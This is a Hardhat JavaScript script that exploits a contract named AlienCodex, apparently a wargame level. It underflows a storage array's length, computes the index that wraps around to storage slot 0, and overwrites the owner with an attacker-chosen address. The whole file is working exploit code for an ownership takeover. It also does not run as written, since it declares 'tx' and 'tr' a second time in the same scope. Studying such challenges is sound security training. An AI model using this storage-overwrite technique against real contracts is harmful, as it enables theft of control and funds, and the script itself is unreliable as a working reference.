const { ethers } = require("hardhat");
const hre = require("hardhat");
async function main() {
    
    //Params
    levelAddress = "0xC9C8Cb819311fbB5E0e214eEe16e58DBe898968d"; // Address of the simple contract created CAN BE COMPUTED WITH keccak256(contractCreatorAddress, numberOfContractCreatedByContractCreator)
    contractName = "AlienCodex";

    const account = await hre.ethers.getSigner();
    console.log(`Working with account ${account.address}`);
    const Level = await hre.ethers.getContractFactory(contractName);
    const level = await Level.attach(levelAddress);
    // const level = await Level.deploy();
    console.log(`Level at address ${level.address}`);

    
    let tx = await level.make_contact()
    let tr = await tx.wait()
    tx = await level.retract();
    tr = await tx.wait();

    let length = await hre.ethers.provider.getStorageAt(level.address,1);
    console.log(length);

    let indexStart = ethers.BigNumber.from(hre.ethers.utils.keccak256(hre.ethers.utils.hexZeroPad("0x1",32)));
    let index= ethers.BigNumber.from(2).pow(256).sub(indexStart);
    console.log(indexStart,indexStart.toHexString());
    console.log(index, index.toHexString())

    let tx= await level.revise(index,hre.ethers.utils.hexZeroPad("0xC630aB9dBa9C044E7737454428a47b811940FC7C",32));
    let tr = await tx.wait();

    result = await level.owner();
    console.log(result);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
